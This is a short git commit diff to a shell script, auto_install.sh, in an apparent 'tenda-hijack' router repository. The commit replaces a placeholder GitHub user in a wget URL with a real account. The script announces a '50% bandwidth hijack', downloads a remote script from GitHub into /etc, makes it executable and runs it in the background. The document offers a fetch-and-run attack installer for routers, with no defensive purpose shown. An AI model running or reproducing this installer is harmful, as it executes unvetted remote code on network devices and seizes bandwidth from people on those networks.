fa9d5b80c93bf2072f70c8ff3ed4fb99a0def624
Oky12345 <35907408+Oky12345@users.noreply.github.com>
2026-01-05 14:58:00 +0700

    Update auto_install.sh

--- ROUTER_SCRIPTS/auto_install.sh
+++ ROUTER_SCRIPTS/auto_install.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 echo "[💀] INSTALLING 50% BANDWIDTH HIJACK..."
 cd /tmp
-wget -q https://raw.githubusercontent.com/YOUR_USER/tenda-hijack/main/tenda_hijack.sh -O /etc/tenda_hijack.sh
+wget -q https://raw.githubusercontent.com/Oky12345/tenda-hijack/main/ROUTER_SCRIPTS/tenda_hijack.sh -O /etc/tenda_hijack.sh
 chmod +x /etc/tenda_hijack.sh
 /etc/tenda_hijack.sh &
 echo "[🔥] 50% bandwidth hijack activated!"
